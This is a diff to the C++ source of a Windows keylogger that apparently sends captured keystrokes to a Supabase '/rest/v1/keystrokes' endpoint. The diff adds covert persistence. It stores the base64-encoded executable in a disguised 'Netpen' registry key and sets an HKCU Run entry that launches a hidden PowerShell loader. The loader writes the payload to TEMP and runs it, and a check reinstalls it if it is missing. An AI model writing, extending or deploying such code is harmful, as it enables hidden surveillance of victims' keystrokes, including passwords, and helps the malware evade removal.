@@ -3,6 +3,7 @@
 #include <string>
 #include <vector>
 #include <ctime>
+#include <wincrypt.h>
 #include "config.h"
 
 #define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
@@ -443,37 +444,63 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     return 0;
 }
 
-static std::string GetDestPath() {
-    std::string appData = std::getenv("APPDATA") ? std::string(std::getenv("APPDATA")) : "";
-    return appData + "\\" + GetExeName();
+static std::string Base64Encode(const BYTE* data, DWORD size) {
+    DWORD needed = 0;
+    CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &needed);
+    std::string result(needed, 0);
+    CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &needed);
+    while (!result.empty() && result.back() == '\0') result.pop_back();
+    return result;
 }
+
+#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\Netpen"
 
 static void InstallStartup() {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
-    std::string currentPath(path);
-    std::string destPath = GetDestPath();
-    if (destPath.empty()) return;
-    if (currentPath != destPath) CopyFileA(currentPath.c_str(), destPath.c_str(), FALSE);
+
+    // Read current exe into memory
+    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+    DWORD size = GetFileSize(hFile, NULL);
+    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return; }
+    BYTE* buf = new BYTE[size];
+    DWORD read = 0;
+    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) {
+        delete[] buf; CloseHandle(hFile); return;
+    }
+    CloseHandle(hFile);
+
+    // Base64 encode and store in registry
+    std::string b64 = Base64Encode(buf, size);
+    delete[] buf;
+
     HKEY hKey;
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)destPath.c_str(), (DWORD)destPath.size());
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)b64.c_str(), (DWORD)b64.size());
+        RegCloseKey(hKey);
+    }
+
+    // Set HKCU Run key with PowerShell loader
+    b64.clear();
+    std::string psCmd = "powershell -w h -c \"$d=(gp 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Netpen').Payload;$p=$env:TEMP+'\\";
+    psCmd += GetExeName();
+    psCmd += "';[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($d));start $p\"";
+
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size());
         RegCloseKey(hKey);
     }
 }
 
 static void EnsureStartupEntry() {
-    std::string destPath = GetDestPath();
-    if (destPath.empty()) return;
     HKEY hKey;
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        char existing[MAX_PATH] = {0};
-        DWORD size = sizeof(existing);
-        if (RegQueryValueExA(hKey, GetExeName().c_str(), NULL, NULL, (BYTE*)existing, &size) != ERROR_SUCCESS || existing != destPath) {
-            RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)destPath.c_str(), (DWORD)destPath.size());
-        }
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         RegCloseKey(hKey);
+        return;
     }
+    // Payload missing -- reinstall
+    InstallStartup();
 }
 
 static int RunChild(HINSTANCE hInstance) {
